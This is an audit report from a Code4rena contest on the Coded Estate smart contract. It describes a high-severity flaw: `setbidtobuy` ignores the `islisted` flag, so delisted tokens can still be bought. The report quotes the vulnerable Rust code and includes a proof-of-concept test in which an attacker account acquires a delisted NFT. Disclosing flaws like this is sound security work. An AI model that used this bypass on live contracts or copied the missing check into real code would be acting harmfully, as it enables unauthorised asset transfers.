---
tags:
  - lang/rust
  - platform/code4rena
  - has/github
  - severity/high
  - sector/options
  - sector/stable
protocol: "[[Coded Estate]]"
auditors:
  - "[[nnez]]"
report: "https://code4rena.com/reports/2024-10-coded-estate"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
---
# [H-02] `setbidtobuy` allows token purchase even when sale is no longer listed

- id: 45189
- impact: HIGH
- protocol: [[Coded Estate]]
- reporter: nnez (Code4rena)
- source: https://code4rena.com/reports/2024-10-coded-estate

## Summary


The bug report highlights a flaw in the `setbidtobuy` function, which allows buyers to purchase tokens that have been delisted by the seller. This means that the seller's intent to halt the sale is bypassed, resulting in unintended sales and potential loss or misuse of assets. The bug occurs because the function does not check the `sell.islisted` flag, which indicates whether a token is still available for sale. This allows buyers to acquire delisted tokens without the seller's consent. The report includes a code snippet and a proof-of-concept test to demonstrate the bug. The recommended mitigation is to disallow buying tokens with the `sell.islisted` flag set to false or none. The bug has been acknowledged by the team and the severity has been increased to High by the judge.

## Details


The bug allows buyers to purchase tokens that have been delisted by the seller, bypassing the seller’s intent to halt the sale. This can result in tokens being sold against the seller's wishes.

### Description

The `setbidtobuy` function is responsible for allowing buyers to submit bids to purchase a token listed for sale. A seller can invoke `setlistforsell` to list a token, specifying the price, payment token (denom), and whether the sale is auto-approved. If auto-approve is set to `true`, any buyer who calls `setbidtobuy` can acquire the token without further input from the seller, while a manual approval is required when auto-approve is set to `false`.

However, there is a flaw in the logic of `setbidtobuy`-it does not check the `sell.islisted` flag, which is supposed to indicate whether a token is still available for sale. Even if the seller later decides to delist the token by setting `sell.islisted` to `false`, buyers can still invoke `setbidtobuy` and proceed with the purchase if auto-approve is enabled. This creates a scenario where sellers lose control over the sale, allowing unintended buyers to purchase delisted tokens.

### Example Scenario:

1. A seller lists a token using `setlistforsell`, specifying the sale details including price, payment token, and setting `auto-approve` to `true`.
2. After some time, the seller receives no bids and decides to delist the token, changing `sell.islisted` to `false` while leaving other parameters unchanged.
3. A buyer invokes `setbidtobuy`, and because the function does not respect the `islisted` flag and auto-approve is `true`, the token is sold despite the seller’s intent to delist it. This results in an unintended sale, leading to potential loss or misuse of assets by the seller.

An action of delisting the token on sale in this manner is justified because there is no other functions serving this purpose as in short-term rental and long-term rental where there is a specific function to unlist the token from rental service.

### Code Snippet

The following snippet shows that the `islisted` flag is not verified in `setbidtobuy`, which allows unintended purchases:

<details>

```rust
pub fn setlistforsell(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    islisted:bool,
    token_id: String,
    denom: String,
    price: u64,
    auto_approve: bool,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    // @c4-contest islisted indicates whether token is available for sale or not
    token.sell.islisted = Some(islisted);
    token.sell.price = price;
    token.sell.auto_approve = auto_approve;
    token.sell.denom = denom;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforsell")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

pub fn setbidtobuy(
    // function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;

    // @c4-contest: no check for the value of sell.islisted flag

    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64);
    for (i, item) in token.bids.iter().enumerate() {
        if item.address == info.sender.to_string()
        {
            position = i as i32;
            amount = item.offer.into();
            break;
        }
    }

    if position == -1 {
        if info.funds[0].denom != token.sell.denom {
            return Err(ContractError::InvalidDeposit {});
        }
        if info.funds[0].amount
            < Uint128::from(token.sell.price)
        {
            return Err(ContractError::InsufficientDeposit {});
        }

        if token.sell.auto_approve {
            // update the approval list (remove any for the same spender before adding)
            let expires = Expiration::Never {  };
            token.approvals.retain(|apr| apr.spender != info.sender);
            let approval = Approval {
                spender: info.sender.clone(),
                expires,
            };
            token.approvals.push(approval);
            
        }
        let bid = Bid {
            address: info.sender.to_string(),
            offer:info.funds[0].amount,
        };
        token.bids.push(bid);
    }

    else {
        // update the approval list (remove any for the same spender before adding)
        token.bids.retain(|item| item.address != info.sender);
    }

    self.tokens.save(deps.storage, &token_id, &token)?;
    if position != -1 && (amount > Uint128::from(0u64)) {
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: info.sender.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom,
                amount: amount,
            }],
        }))
    }
    else {
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
    }

}
```

</details>

This lack of validation enables buyers to acquire delisted tokens without the seller's consent.

### Proof-of-Concept

The following test demonstrates that a buyer can still buy delisted token (token with islisted set to false).

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from the above secret gist.
2. Insert the below test:

<details>

```rust
#[test]
fn m3_buyer_can_buy_delisted_token() {
    let (mut app, contract_addr) = mock_app_init_contract();

    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that a token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists their token for sale, set auto-approve = true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Time goes by, there is no bid
    // Minter decides to delist this token temporarily by setting islited = false
    let delist_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: false, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &delist_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Query for token sell info
    let get_info_sell_msg: QueryMsg<Empty> = QueryMsg::NftInfoSell { token_id: TOKEN_ID.to_string() };
    let info: Sell = app.wrap().query_wasm_smart(contract_addr.clone(), &get_info_sell_msg).unwrap();
    // Asserts that islisted is false
    let islisted: bool = info.islisted.unwrap();
    assert!(!islisted);


    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);
        
    // Attacker attempts to buy the delisted token
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Attacker completes the trade by calling transfer_nft
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker is the owner of the token.  
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER);
    // Asserts taht Minter is no longer owner of the token
    assert_ne!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), MINTER);
}
```

</details>

3. Run `cargo test m3_buyer_can_buy_delisted_token -- --nocapture`.
4. Observe that the test passes, indicating that the described scenario is valid.

### Recommended Mitigation

Disallow buying token with `sell.islisted` flag set to false/none.

### Assessed type

Context

**[blockchainstar12 (Coded Estate) acknowledged](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/23#event-14637246931)**

**[Lambda (judge) increased severity to High](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/23#issuecomment-2425069346)**

***
